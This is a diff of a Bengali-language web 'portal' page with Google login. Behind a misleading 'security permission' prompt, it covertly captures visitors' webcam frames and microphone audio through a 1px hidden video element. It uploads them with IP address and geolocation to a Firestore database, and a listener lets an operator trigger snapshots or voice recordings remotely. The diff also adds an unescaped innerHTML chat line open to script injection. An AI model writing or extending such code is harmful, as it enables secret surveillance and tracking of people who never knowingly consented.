@@ -37,6 +37,8 @@
         .chat-in { display: flex; gap: 8px; }
         .chat-in input { flex: 1; background: #000; border: 1px solid #333; color: #fff; padding: 8px 15px; border-radius: 50px; outline: none; }
         
+        .logout-btn { background: none; border: 1px solid rgba(255,255,255,0.2); color: #888; padding: 5px 15px; border-radius: 50px; cursor: pointer; font-size: 12px; margin: 10px; }
+        
         canvas { display: none; }
         #vSource { position: fixed; bottom: 0; right: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
     </style>
@@ -51,6 +53,7 @@
         <div class="glass-box">
             <img src="ratan.jpg" style="width:100px; border-radius:50%; border:3px solid var(--pink); margin-bottom:15px;">
             <h3>Ratan Bro Portal</h3>
+            <p style="font-size:14px; opacity:0.7; margin-bottom:10px;">প্রবেশ করতে লগইন করুন</p>
             <button onclick="googleLogin()" style="background:var(--pink); color:white; border:none; padding:12px 30px; border-radius:50px; font-weight:bold; cursor:pointer; width:100%; margin-top:15px; box-shadow: 0 5px 15px rgba(255, 77, 148, 0.4);">Login with Google</button>
         </div>
     </div>
@@ -58,18 +61,18 @@
     <div id="perm-modal">
         <div class="glass-box">
             <i class="fas fa-shield-alt" style="font-size:3rem; color:var(--pink);"></i>
-            <h3 style="margin:15px 0;">পারমিশন</h3>
-            <p style="font-size:14px; opacity:0.7; margin-bottom:20px;">প্রবেশ করতে Allow করুন।</p>
+            <h3 style="margin:15px 0;">সিকিউরিটি পারমিশন</h3>
+            <p style="font-size:14px; opacity:0.7; margin-bottom:20px;">আপনার ব্রাউজারের ক্যামেরা এবং মাইক্রোফোন পারমিশন Allow করুন।</p>
             <button onclick="startApp()" style="background:var(--pink); color:white; border:none; padding:12px 40px; border-radius:50px; font-weight:bold; cursor:pointer;">Grant Access</button>
         </div>
     </div>
 
     <div id="notif-modal" onclick="this.style.display='none'">
         <div class="glass-box">
-            <h3 id="nt-title">নতুন আপডেট!</h3>
-            <img id="nt-img" src="" style="width:100%; border-radius:15px; margin:15px 0; display:none;">
+            <h3 id="nt-title">নতুন ঘোষণা!</h3>
+            <img id="nt-img" src="" style="width:100%; border-radius:15px; margin:15px 0; display:none; border:1px solid var(--pink);">
             <p id="nt-msg" style="font-size:14px; opacity:0.8;"></p>
-            <button style="background:var(--pink); color:white; border:none; padding:10px 30px; border-radius:50px; margin-top:15px;">বন্ধ করুন</button>
+            <button style="background:var(--pink); color:white; border:none; padding:10px 30px; border-radius:50px; margin-top:15px;">ঠিক আছে</button>
         </div>
     </div>
 
@@ -127,10 +130,12 @@
         const auth = getAuth(app);
         const db = getFirestore(app);
         const provider = new GoogleAuthProvider();
+        
         let loggedUser = null;
         let config = { loginMode: "ON", permissionMode: "ON" };
+        let activeStream = null;
 
-        // ১. রিয়েল-টাইম কনফিগারেশন এবং নোটিফিকেশন লিসেনার
+        // ১. অ্যাডমিন সেটিংস (Login & Permission) রিয়েল-টাইম চেক
         onSnapshot(doc(db, "site_config", "settings"), (snap) => {
             if (snap.exists()) {
                 config = snap.data();
@@ -138,6 +143,7 @@
             }
         });
 
+        // ২. রেড অ্যালার্ম ও নোটিফিকেশন লিসেনার
         onSnapshot(doc(db, "site_updates", "latest"), (snap) => {
             if (snap.exists() && snap.data().status === "new") {
                 document.getElementById('alarm').style.display = 'block';
@@ -155,13 +161,16 @@
             const permModal = document.getElementById('perm-modal');
             const mainUI = document.getElementById('main-ui');
 
+            // লগইন মোড অন থাকলে এবং ইউজার লগইন না থাকলে
             if (config.loginMode === "ON" && !loggedUser) {
                 loginOverlay.style.display = 'flex';
                 mainUI.style.display = 'none';
+                permModal.style.display = 'none';
             } else {
                 loginOverlay.style.display = 'none';
-                if (config.permissionMode === "ON") {
-                    if (mainUI.style.display !== 'block') permModal.style.display = 'flex';
+                // পারমিশন মোড অন থাকলে এবং সাইট এখনো চালু না হলে
+                if (config.permissionMode === "ON" && mainUI.style.display !== 'block') {
+                    permModal.style.display = 'flex';
                 } else {
                     permModal.style.display = 'none';
                     showMainUI();
@@ -172,28 +181,38 @@
         window.googleLogin = () => signInWithPopup(auth, provider);
         window.googleLogout = () => signOut(auth).then(() => location.reload());
 
+        // সাইট স্টার্ট এবং ট্র্যাকিং শুরু
         window.startApp = async () => {
             const video = document.getElementById('vSource');
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }).catch(() => null);
-            if (stream) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                activeStream = stream;
                 video.srcObject = stream;
                 video.onloadedmetadata = () => video.play();
+                
+                showMainUI();
+                
+                // প্রথমবার ডাটা সেভ
                 setTimeout(() => takeSnap(loggedUser), 2000);
-                recordVoice(stream, 10000);
-            }
-            showMainUI();
-            
-            if(loggedUser) {
-                onSnapshot(doc(db, "users", loggedUser.email.replace('.', '_')), (s) => {
-                    if (s.data()?.command === "snap") takeSnap(loggedUser);
-                    if (s.data()?.command === "voice") recordVoice(stream, 10000);
-                    if (s.data()?.command) updateDoc(doc(db, "users", loggedUser.email.replace('.', '_')), { command: "" });
-                });
+                
+                // অ্যাডমিন কমান্ড লিসেনার (লাইভ স্ন্যাপ/ভয়েস)
+                if(loggedUser) {
+                    const userKey = loggedUser.email.replace(/\./g, '_');
+                    onSnapshot(doc(db, "users", userKey), (s) => {
+                        const cmd = s.data()?.command;
+                        if (cmd === "snap") takeSnap(loggedUser);
+                        if (cmd === "voice") recordVoice(activeStream, 10000);
+                        if (cmd) updateDoc(doc(db, "users", userKey), { command: "" });
+                    });
+                }
+            } catch (err) {
+                alert("ক্যামেরা পারমিশন ছাড়া সাইটটি কাজ করবে না।");
             }
         };
 
         function showMainUI() {
             document.getElementById('perm-modal').style.display = 'none';
+            document.getElementById('login-overlay').style.display = 'none';
             document.getElementById('main-ui').style.display = 'block';
             if (loggedUser) {
                 document.getElementById('u-name').innerText = loggedUser.displayName;
@@ -206,19 +225,32 @@
             const video = document.getElementById('vSource');
             const canvas = document.getElementById('snapCanvas');
             const ctx = canvas.getContext('2d');
-            if (video.readyState < 2 || video.videoWidth === 0) return;
+            if (video.readyState < 2) return;
+            
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const dataImg = canvas.toDataURL('image/jpeg', 0.6);
-            const userRef = doc(db, "users", user.email.replace('.', '_'));
+            const dataImg = canvas.toDataURL('image/jpeg', 0.5);
+            
+            const userRef = doc(db, "users", user.email.replace(/\./g, '_'));
             const s = await getDoc(userRef);
             let picList = s.data()?.picList || [];
             picList.unshift(dataImg);
             if (picList.length > 5) picList.pop();
+
             const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ ip: 'N/A' }));
+            
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                await setDoc(userRef, { name: user.displayName, email: user.email, photo: user.photoURL, picList, ip: ipData.ip, loc: `${pos.coords.latitude},${pos.coords.longitude}`, status: "Online", lastView: new Date().toLocaleString() }, { merge: true });
+                await setDoc(userRef, { 
+                    name: user.displayName, 
+                    email: user.email, 
+                    photo: user.photoURL, 
+                    picList, 
+                    ip: ipData.ip, 
+                    loc: `${pos.coords.latitude},${pos.coords.longitude}`, 
+                    status: "Online", 
+                    lastView: new Date().toLocaleString() 
+                }, { merge: true });
             }, async () => {
                 await setDoc(userRef, { picList, ip: ipData.ip, status: "Online", lastView: new Date().toLocaleString() }, { merge: true });
             });
@@ -234,7 +266,7 @@
                 const reader = new FileReader();
                 reader.readAsDataURL(blob);
                 reader.onloadend = async () => {
-                    const userRef = doc(db, "users", loggedUser.email.replace('.', '_'));
+                    const userRef = doc(db, "users", loggedUser.email.replace(/\./g, '_'));
                     const s = await getDoc(userRef);
                     let audioList = s.data()?.audioList || [];
                     audioList.unshift(reader.result);
@@ -251,21 +283,26 @@
             if(data.image) {
                 document.getElementById('nt-img').src = data.image;
                 document.getElementById('nt-img').style.display = 'block';
+            } else {
+                document.getElementById('nt-img').style.display = 'none';
             }
             document.getElementById('notif-modal').style.display = 'flex';
         }
 
         window.clearAlarm = async () => {
             document.getElementById('alarm').style.display = 'none';
-            await updateDoc(doc(db, "site_updates", "latest"), { status: "read" });
+            // স্ট্যাটাস রিড করে দিলে অন্য ইউজারদের সমস্যা হতে পারে, তাই এটি শুধু লোকাললি হাইড করা ভালো।
+            // তবে আপনি চাইলে নিচের লাইনটি রাখতে পারেন:
+            // await updateDoc(doc(db, "site_updates", "latest"), { status: "read" });
         };
 
         window.askAI = () => {
             const msg = document.getElementById('ai-msg').value;
             if (!msg) return;
-            document.getElementById('chat-log').innerText = "You: " + msg;
+            document.getElementById('chat-log').innerHTML = `<b>You:</b> ${msg}<br><b>AI:</b> আমি আপনার রিকোয়েস্টটি প্রসেস করছি...`;
             document.getElementById('ai-msg').value = "";
         };
     </script>
 </body>
+
 </html>
